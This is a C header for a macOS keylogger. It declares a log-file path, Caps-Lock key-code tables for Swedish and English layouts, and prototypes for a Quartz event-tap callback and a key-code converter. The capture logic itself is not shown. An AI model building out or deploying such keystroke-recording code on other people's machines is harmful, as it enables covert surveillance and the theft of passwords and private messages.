#ifndef __KEYLOGGER_H__
#define __KEYLOGGER_H__

#include <stdio.h>
#include <stdbool.h>
#include <time.h>
#include <string.h>
#include <libgen.h>
#include <signal.h>
#include <ApplicationServices/ApplicationServices.h>
#include <Carbon/Carbon.h>
// https://developer.apple.com/library/mac/documentation/Carbon/Reference/QuartzEventServicesRef/Reference/reference.html

const char *logfileLocation = NULL;
#if KEYBOARD_SV
const char *keyboard = "sv";
const int affectedByCaps[] = {0,1,2,3,4,5,6,7,8,9,11,12,13,14,15,16,17,31,32,34,35,37,38,40,45,46, 33,39,41};
#else
const char *keyboard = "en";
const int affectedByCaps[] = {0,1,2,3,4,5,6,7,8,9,11,12,13,14,15,16,17,31,32,34,35,37,38,40,45,46};
#endif

CGEventRef CGEventCallback(CGEventTapProxy, CGEventType, CGEventRef, void*);
const char *convertKeyCode(int, bool, bool);

#endif